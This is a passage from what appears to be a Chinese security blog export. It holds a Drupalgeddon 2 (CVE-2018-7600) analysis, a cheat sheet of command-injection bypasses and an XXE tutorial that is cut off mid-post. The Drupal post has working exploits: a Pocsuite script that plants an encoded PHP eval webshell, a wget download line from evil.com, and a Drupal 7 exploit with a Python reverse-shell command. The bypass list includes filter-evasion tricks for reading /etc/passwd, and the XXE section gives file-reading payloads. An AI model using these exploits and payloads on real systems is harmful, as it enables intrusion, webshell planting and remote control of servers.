On</span><br><span class="line">xdebug.collect_params = On</span><br><span class="line"></span><br><span class="line">xdebug.remote_handler = "dbgp"</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line">xdebug.remote_port = 9000</span><br><span class="line">xdebug.remote_host = 0.0.0.0</span><br></pre></td></tr></table></figure><p>然后，重启apache</p><p><code>service apache2 restart</code></p><p>重新start容器。</p><p>到这里，xdebug应该就配置完成了。</p><p>端口转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">外网服务器，假设ip为118.99.64.123</span><br><span class="line">内网主机，127.0.0.1</span><br><span class="line"></span><br><span class="line">外网服务器</span><br><span class="line">./nb -listen 9000 8000</span><br><span class="line"></span><br><span class="line">内网主机</span><br><span class="line">nb.exe  -slave 118.99.64.123:8000 127.0.0.1:9000</span><br></pre></td></tr></table></figure><p>PHP Storm</p><blockquote><p>打开源码项目，开启listen，下个断点</p></blockquote><p>浏览器</p><p>访问时，<code>cookie</code>（或其他位置）添加<code>XDEBUG_SESSION=PHPSTORM</code></p><p>添加<code>header</code> 如下<code>X-Forwarded-For: 118.99.64.123</code></p><p>OK，可以愉快地远程调试了。</p><p><img src="/img/drupal/2.png" alt=""></p><h5 id="漏洞分析正文"><a href="#漏洞分析正文" class="headerlink" title="漏洞分析正文"></a>漏洞分析正文</h5><p><img src="/img/drupal/6.png" alt=""></p><p>输入的变量是<code>#</code>开头的数组，进入渲染函数。跟进去</p><p>这个引擎对于特定的标签会调用一些敏感函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#access_callback</span><br><span class="line">Used by Drupal to determine whether or not the current user has access to an element.</span><br><span class="line">#pre_render</span><br><span class="line">Manipulates the render array before rendering.</span><br><span class="line">#lazy_builder</span><br><span class="line">Used to add elements in the very end of the rendering process.</span><br><span class="line">#post_render</span><br><span class="line">Receives the result of the rendering process and adds wrappers around it.</span><br></pre></td></tr></table></figure><p>如，<code>#post_render</code>满足条件时会调用<code>call_user_func</code></p><p>可以看到，调用的函数和参数都是可以控制的。所以存在命令执行。</p><p><img src="/img/drupal/3.png" alt=""></p><p>之前疑惑为什么<code>echo &quot;123&quot;&gt;1.php</code>不能达到重定向到文件的效果，原因是，中间经过了xss filter，将<code>&lt;和&gt;</code>编码了。而，使用<code>wget http://evil.com/attack.txt -O 1.php</code> 是可以的。</p><p><img src="/img/drupal/4.png" alt=""></p><p>可以看到已经被编码了。</p><p><img src="/img/drupal/5.png" alt=""></p><p>xss filter只能给代码执行带来阻碍。</p><p>组合<code>echo</code> 、<code>tr</code> 、<code>tee</code>命令。</p><p>用<code>tr</code>命令进行凯撒加解密（其实用base64也是可以的）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> echo '&lt;?php eval($_POST[c]);' | tr "0-z" ".-x|"</span><br><span class="line">:=nfn ct_j($]NMQRYa[)9</span><br><span class="line"><span class="meta">#</span> echo '&lt;?php eval($_POST[c]);' | tr "0-z" ".-x|"|tr ".-x" "0-z"</span><br><span class="line">&lt;?php eval($_POST[c]);</span><br></pre></td></tr></table></figure><p>用<code>tee</code> 写入文件中。</p><p>所以，构造post的data如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=system&amp;mail[#type]=markup&amp;mail[#markup]= echo ':=nfn ct_j($]NMQRYa[)9' | tr '.-x' '0-z'|tee 1.php</span><br></pre></td></tr></table></figure><p>即可写入webshell。</p><h5 id="分析补丁"><a href="#分析补丁" class="headerlink" title="分析补丁"></a>分析补丁</h5><p>diffs</p><p><img src="/img/drupal/8.png" alt=""></p><p>看到添加了一个<code>RequestSanitizer.php</code>类</p><p><img src="/img/drupal/9.png" alt=""></p><p>对get、post、cookie进行过滤</p><p>若是数组递归地进行过滤</p><p><img src="/img/drupal/10.png" alt=""></p><h4 id="POC-EXP"><a href="#POC-EXP" class="headerlink" title="POC/EXP"></a>POC/EXP</h4><p>写了个Pocsuite的POC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pocsuite.api.request <span class="keyword">import</span> req <span class="comment">#用法和 requests 完全相同</span></span><br><span class="line"><span class="keyword">from</span> pocsuite.api.poc <span class="keyword">import</span> register</span><br><span class="line"><span class="keyword">from</span> pocsuite.api.poc <span class="keyword">import</span> Output, POCBase</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestPOC</span><span class="params">(POCBase)</span>:</span></span><br><span class="line">vulID = <span class="string">'97207'</span>  <span class="comment"># ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span></span><br><span class="line">version = <span class="string">'1'</span> <span class="comment">#默认为1</span></span><br><span class="line">author = <span class="string">'Gaia'</span> <span class="comment">#  PoC作者的大名</span></span><br><span class="line">vulDate = <span class="string">'2018-03-29'</span> <span class="comment">#漏洞公开的时间,不知道就写今天</span></span><br><span class="line">createDate = <span class="string">'2018-04-14'</span><span class="comment"># 编写 PoC 的日期</span></span><br><span class="line">updateDate = <span class="string">'2018-04-14'</span><span class="comment"># PoC 更新的时间,默认和编写时间一样</span></span><br><span class="line">references = [<span class="string">'https://research.checkpoint.com/uncovering-drupalgeddon-2/'</span>]<span class="comment"># 漏洞地址来源,0day不用写</span></span><br><span class="line">name = <span class="string">'Drupal Drupalgeddon 2 远程代码执行漏洞'</span><span class="comment"># PoC 名称</span></span><br><span class="line">appPowerLink = <span class="string">'https://www.drupal.org/'</span><span class="comment"># 漏洞厂商主页地址</span></span><br><span class="line">appName = <span class="string">'Drupal'</span><span class="comment"># 漏洞应用名称</span></span><br><span class="line">appVersion = <span class="string">'&lt;7.58, 8.x&lt;8.3.9, 8.4.x&lt;8.4.6, 8.5.x&lt;8.5.1'</span><span class="comment"># 漏洞影响版本</span></span><br><span class="line">vulType = <span class="string">'Remote Code Execution'</span><span class="comment">#漏洞类型,类型参考见 漏洞类型规范表</span></span><br><span class="line">desc = <span class="string">'''</span></span><br><span class="line"><span class="string">Drupal 是一款用量庞大的CMS，其6/7/8版本的Form API中存在一处远程代码执行漏洞</span></span><br><span class="line"><span class="string"> '''</span> <span class="comment"># 漏洞简要描述</span></span><br><span class="line">samples = []<span class="comment"># 测试样列,就是用 PoC 测试成功的网站</span></span><br><span class="line">install_requires = [] <span class="comment"># PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_attack</span><span class="params">(self)</span>:</span></span><br><span class="line">result = &#123;&#125;</span><br><span class="line">vul_url = <span class="string">'%s/user/register?element_parents=account/mail/%%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax'</span> % self.url</span><br><span class="line">cmd = <span class="string">"echo ':=nfn ct_j($]NMQRYa[)9' | tr '.-x' '0-z'|tee 1.php"</span></span><br><span class="line">payload = &#123;<span class="string">"form_id"</span>:<span class="string">"user_register_form"</span></span><br><span class="line">,<span class="string">"_drupal_ajax"</span>:<span class="string">"1"</span></span><br><span class="line">,<span class="string">"mail[#post_render][]"</span>:<span class="string">"exec"</span></span><br><span class="line">,<span class="string">"mail[#type]"</span>:<span class="string">"markup"</span></span><br><span class="line">,<span class="string">"mail[#markup]"</span>:cmd&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># if not self._verify(verify=False):</span></span><br><span class="line"><span class="comment"># return self.parse_attack(result)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print urllib.urlencode(payload)</span></span><br><span class="line">response = req.post(vul_url, data=payload,proxies=proxies)</span><br><span class="line"><span class="comment"># response = req.post(vul_url, data=payload)</span></span><br><span class="line"><span class="comment"># print response.content</span></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">res = req.post(url = self.url+<span class="string">"/1.php"</span>,data=&#123;<span class="string">"c"</span>:<span class="string">"system(\"id\");"</span>&#125;,proxies=proxies)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"uid"</span> <span class="keyword">in</span> res.content:</span><br><span class="line"><span class="comment"># print res.content</span></span><br><span class="line">result[<span class="string">'ShellInfo'</span>] = &#123;&#125;</span><br><span class="line">result[<span class="string">'ShellInfo'</span>][<span class="string">'URL'</span>] = self.url + <span class="string">"/1.php"</span></span><br><span class="line">result[<span class="string">'ShellInfo'</span>][<span class="string">'content'</span>] = <span class="string">'&lt;?php eval($_POST[c]);'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> self.parse_attack(result)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self, verify=True)</span>:</span></span><br><span class="line">result = &#123;&#125;</span><br><span class="line">vul_url = <span class="string">'%s/user/register?element_parents=account/mail/%%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax'</span> % self.url</span><br><span class="line">cmd = <span class="string">"id"</span></span><br><span class="line">payload = &#123;<span class="string">"form_id"</span>:<span class="string">"user_register_form"</span></span><br><span class="line">,<span class="string">"_drupal_ajax"</span>:<span class="string">"1"</span></span><br><span class="line">,<span class="string">"mail[#post_render][]"</span>:<span class="string">"exec"</span></span><br><span class="line">,<span class="string">"mail[#type]"</span>:<span class="string">"markup"</span></span><br><span class="line">,<span class="string">"mail[#markup]"</span>:cmd&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = req.post(vul_url, data=payload,proxies=proxies).content</span><br><span class="line"><span class="comment"># response = req.post(vul_url, data=payload).content</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'uid'</span> <span class="keyword">in</span> response:</span><br><span class="line">result[<span class="string">'VerifyInfo'</span>] = &#123;&#125;</span><br><span class="line">result[<span class="string">'VerifyInfo'</span>][<span class="string">'URL'</span>] = self.url</span><br><span class="line">result[<span class="string">'VerifyInfo'</span>][<span class="string">'Payload'</span>] = urllib.urlencode(payload)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> self.parse_attack(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> self.parse_attack(result)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_attack</span><span class="params">(self, result)</span>:</span></span><br><span class="line">output = Output(self)</span><br><span class="line"><span class="keyword">if</span> result:</span><br><span class="line">output.success(result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">output.fail(<span class="string">'Internet nothing returned'</span>)</span><br><span class="line"><span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">register(TestPOC)</span><br></pre></td></tr></table></figure><h2 id="版本-drupal-7-5-6"><a href="#版本-drupal-7-5-6" class="headerlink" title="版本: drupal 7.5.6"></a>版本: drupal 7.5.6</h2><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>360春秋杯的题目，给了个drupal 7.5.6的Ubuntu 16.04虚拟机。</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>此漏洞的代码执行主要在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#access_callback</span><br><span class="line">Used by Drupal to determine whether or not the current user has access to an element.</span><br><span class="line">#pre_render</span><br><span class="line">Manipulates the render array before rendering.</span><br><span class="line">#lazy_builder</span><br><span class="line">Used to add elements in the very end of the rendering process.</span><br><span class="line">#post_render</span><br><span class="line">Receives the result of the rendering process and adds wrappers around it.</span><br></pre></td></tr></table></figure><p>渲染引擎对这几个标签的处理上是会调用如<code>call_user_func</code> 。</p><p>如，<code>#post_render</code>满足条件时会调用<code>call_user_func</code></p><p>drupal调用链比较复杂。</p><p>尝试搜索<code>renderRoot</code> 发现找不到，因为drupal 8 加入了更多的面向对象的元素。</p><p>尝试搜索<code>post_render</code></p><p><img src="/img/drupal/11.png" alt=""></p><p>容易看出最终调用的地方在这里。</p><p>drupal/includes/common.inc</p><p><img src="/img/drupal/12.png" alt=""></p><p>接下来就需要找一个合适的入口点了。</p><p>一直找不到，直到找到一个地方，</p><p>在重置用户密码处，将提交表单的请求信息缓存进数据库，</p><p><img src="/img/drupal/13.png" alt=""></p><p>然后，在另外一个调用中将其取出，在这时触发代码执行。</p><p>drupal/includes/common.inc</p><p><img src="/img/drupal/14.png" alt=""></p><p>可以看到取出的参数，用于后面的</p><p><code>$function($elements[&#39;#children&#39;], $elements);</code></p><p>导致代码执行。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>漏洞思路分两步</p><ul><li>请求，得到cache form id</li></ul><p><img src="/img/drupal/15.png" alt=""></p><ul><li>通过cache form id触发代码执行</li></ul><p><img src="/img/drupal/16.png" alt=""></p><p>利用代码</p><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">HOST=<span class="string">"http://192.168.1.230/drupal/"</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'id'</span></span><br><span class="line">get_params = &#123;<span class="string">'q'</span>:<span class="string">'user/password'</span>, <span class="string">'name[#post_render][]'</span>:<span class="string">'passthru'</span>, <span class="string">'name[#markup]'</span>:cmd, <span class="string">'name[#type]'</span>:<span class="string">'markup'</span>&#125;</span><br><span class="line">post_params = &#123;<span class="string">'form_id'</span>:<span class="string">'user_pass'</span>, <span class="string">'_triggering_element_name'</span>:<span class="string">'name'</span>&#125;</span><br><span class="line">r = requests.post(HOST, data=post_params, params=get_params)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print r.content</span></span><br><span class="line">m = re.search(<span class="string">r'&lt;input type="hidden" name="form_build_id" value="([^"]+)" /&gt;'</span>, r.text)</span><br><span class="line"><span class="keyword">if</span> m:</span><br><span class="line">    found = m.group(<span class="number">1</span>)</span><br><span class="line">    get_params = &#123;<span class="string">'q'</span>:<span class="string">'file/ajax/name/#value/'</span> + found&#125;</span><br><span class="line">    post_params = &#123;<span class="string">'form_build_id'</span>:found&#125;</span><br><span class="line">    r = requests.post(HOST, data=post_params, params=get_params)</span><br><span class="line">    print(r.text)</span><br></pre></td></tr></table></figure><p>exp</p><p>只需修改<code>cmd = &#39;id&#39;</code>为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;your_ip_addr\&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;&quot;</span><br></pre></td></tr></table></figure><p>注意替换ip地址，反弹shell就ok。</p><p><img src="/img/drupal/17.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600</a></p><p><a href="https://research.checkpoint.com/uncovering-drupalgeddon-2/" target="_blank" rel="noopener">https://research.checkpoint.com/uncovering-drupalgeddon-2/</a></p><p><a href="https://paper.seebug.org/567/" target="_blank" rel="noopener">https://paper.seebug.org/567/</a></p><p><a href="https://github.com/FireFart/CVE-2018-7600" target="_blank" rel="noopener">https://github.com/FireFart/CVE-2018-7600</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>命令注入漏洞</title>
      <link href="//blog/2018/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"/>
      <url>//blog/2018/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html</url>
      
        <content type="html"><![CDATA[<hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>命令注入，通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。基本上，每一个命令注入都是危害极大的。</p></blockquote><h2 id="基本形式"><a href="#基本形式" class="headerlink" title="基本形式"></a>基本形式</h2><h2 id="命令分隔方法"><a href="#命令分隔方法" class="headerlink" title="命令分隔方法"></a>命令分隔方法</h2><h3 id="0a换行"><a href="#0a换行" class="headerlink" title="%0a换行"></a><code>%0a</code>换行</h3><h3 id="0d回车"><a href="#0d回车" class="headerlink" title="%0d回车"></a><code>%0d</code>回车</h3><h3 id=""><a href="#" class="headerlink" title=";"></a><code>;</code></h3><h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a><code>&amp;</code></h3><h3 id="-1"><a href="#-1" class="headerlink" title="|"></a><code>|</code></h3><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/???/c?t/p??swd 代替 /bin/cat /etc/passwd</span><br><span class="line">/???/n? 代替 /bin/nc</span><br></pre></td></tr></table></figure><h3 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/'b'i''n/'c''at' /e't'c/p''as''sw'd'</span><br></pre></td></tr></table></figure><h3 id="续行符-绕过"><a href="#续行符-绕过" class="headerlink" title="续行符\绕过"></a>续行符<code>\</code>绕过</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\c\a\t \/\e\t\c\/\p\a\s\s\w\d</span><br><span class="line">可加回车</span><br><span class="line">c\</span><br><span class="line">at /etc/passwd</span><br></pre></td></tr></table></figure><h3 id="用-lt-绕过空格"><a href="#用-lt-绕过空格" class="headerlink" title="用&lt;绕过空格"></a>用<code>&lt;</code>绕过空格</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;/etc/passwd</span><br></pre></td></tr></table></figure><h3 id="用-IFS-9绕过空格"><a href="#用-IFS-9绕过空格" class="headerlink" title="用$IFS$9绕过空格"></a>用<code>$IFS$9</code>绕过空格</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">cat$</span>IFS/etc/passwd</span><br><span class="line"><span class="meta">cat$</span>&#123;IFS&#125;/etc/passwd</span><br><span class="line"><span class="meta">cat$</span>&#123;IFS&#125;$9/etc/passwd</span><br></pre></td></tr></table></figure><h3 id="变量拼接绕过"><a href="#变量拼接绕过" class="headerlink" title="变量拼接绕过"></a>变量拼接绕过</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=l;b=s;$a$b</span><br></pre></td></tr></table></figure><h3 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo "Y2F0IC9ldGMvcGFzc3dkCg=="|base64 -d`</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>XXE漏洞</title>
      <link href="//blog/2018/XXE%E6%BC%8F%E6%B4%9E.html"/>
      <url>//blog/2018/XXE%E6%BC%8F%E6%B4%9E.html</url>
      
        <content type="html"><![CDATA[<h2 id="XML应用场景"><a href="#XML应用场景" class="headerlink" title="XML应用场景"></a>XML应用场景</h2><ol><li>数据传输</li><li>配置文件</li><li>数据存储(小型数据库)</li></ol><h2 id="XML文档结构"><a href="#XML文档结构" class="headerlink" title="XML文档结构"></a>XML文档结构</h2><ol><li><p>文档声明</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span> standalone=<span class="string">"yes"</span> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>DTD文档类型定义(可选)<br>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。<br>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p></li><li><p>元素<br>XML文档有且只有一个root元素<br>标签对应元素</p></li><li>属性<br>元素的属性参考HTML</li><li><p>注释</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 注释 --&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>CDATA区、特殊字符<br>CDATA节，保存纯字节数据，不会被引擎解析</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[</span><br><span class="line">...........</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure></li><li><p>处理指令</p></li></ol><h2 id="DTD介绍"><a href="#DTD介绍" class="headerlink" title="DTD介绍"></a>DTD介绍</h2><h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure><h3 id="外部声明DTD"><a href="#外部声明DTD" class="headerlink" title="外部声明DTD"></a>外部声明DTD</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称 SYSTEM "URI/URL"&gt;</span></span><br><span class="line">或者</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称 PUBLIC "公共名称" "URL"&gt;</span></span><br></pre></td></tr></table></figure><h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 "实体的值"&gt;</span></span><br></pre></td></tr></table></figure><h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XXE-XML-External-Entity-Injection-漏洞"><a href="#XXE-XML-External-Entity-Injection-漏洞" class="headerlink" title="XXE (XML External Entity Injection)漏洞"></a>XXE (XML External Entity Injection)漏洞</h2><p>XXE漏洞发生在服务端在解析用户上传的(污染的)XML文件时，没有禁止外部实体的加载，导致可以加载外部文件</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可实现的能力</p><blockquote><p>文件读取<br>扫描内网<br>命令执行</p></blockquote><h3 id="PHP-XXE-漏洞利用"><a href="#PHP-XXE-漏洞利用" class="headerlink" title="PHP XXE 漏洞利用"></a>PHP XXE 漏洞利用</h3><h4 id="正常payload"><a href="#正常payload" class="headerlink" title="正常payload"></a>正常payload</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pass</span>&gt;</span>password<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="读取文件payload"><a href="#读取文件payload" class="headerlink" title="读取文件payload"></a>读取文件payload</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY data SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;data;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="无回显payload"><a href="#无回显payload" class="headerlink" title="无回显payload"></a>无回显payload</h4><p>发送的xml<br><figure class="highlight 